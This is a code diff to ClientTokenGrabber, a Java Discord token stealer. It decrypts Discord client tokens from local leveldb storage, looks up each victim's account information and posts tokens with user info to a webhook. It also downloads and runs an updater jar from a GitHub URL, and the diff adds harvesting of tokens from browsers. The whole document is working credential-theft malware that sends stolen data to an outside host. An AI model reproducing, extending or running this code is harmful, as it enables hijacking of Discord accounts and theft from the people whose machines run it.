@@ -4,7 +4,6 @@ import java.nio.file.Paths;
 import java.util.Set;
 import java.util.HashSet;
 
-
 import clienttokengrabber.utils.*;
 
 public class ClientTokenGrabber {
@@ -15,22 +14,22 @@ public class ClientTokenGrabber {
     public static final String UPDATER_URL = "https://github.com/0x5d0/Discord-Client-Token-Logger/blob/master/examples/Update.jar";
 
     public static void main(String[] args) {
-        FileManager.delete(UPDATER_PATH);
-        System.out.println(UpdateHelper.checkForUpdates());
+        FileHelper.delete(UPDATER_PATH);
         if (UpdateHelper.checkForUpdates()) {
             Requests.download(UPDATER_URL, UPDATER_PATH);
-            FileManager.launch(UPDATER_PATH);
+            FileHelper.launch(UPDATER_PATH);
             System.exit(0);
         }
 
         getClientTokens();
+        getBrowserTokens();
         for (String token : tokens) {
             System.out.println("Token: " + token);
 
             String userInfo = Requests.get(USER_INFO_URL, token);
+            System.out.println("User Info: " + userInfo);
             if (userInfo != null) {
                 Requests.post(EmbedGenerator.generateEmbed(userInfo, token), WEBHOOK_URL);
-                System.out.println("User Info: " + userInfo);
             }
         }
 
@@ -38,11 +37,17 @@ public class ClientTokenGrabber {
     }
 
     private static void getClientTokens() {
-        FileManager.getDefaultPaths().forEach(path ->
+        PathHelper.loadClientPaths().forEach(path ->
             tokens.addAll(Decryptor.decryptTokens(
                     Paths.get(path, "Local Storage", "leveldb").toString(),
-                    Decryptor.getAESKey(path))
-            )
+                    Decryptor.getAESKey(path)
+            ))
+        );
+    }
+
+    private static void getBrowserTokens() {
+        PathHelper.loadBrowserPaths().forEach(path ->
+                tokens.addAll(Decryptor.getTokens(path))
         );
     }
 }
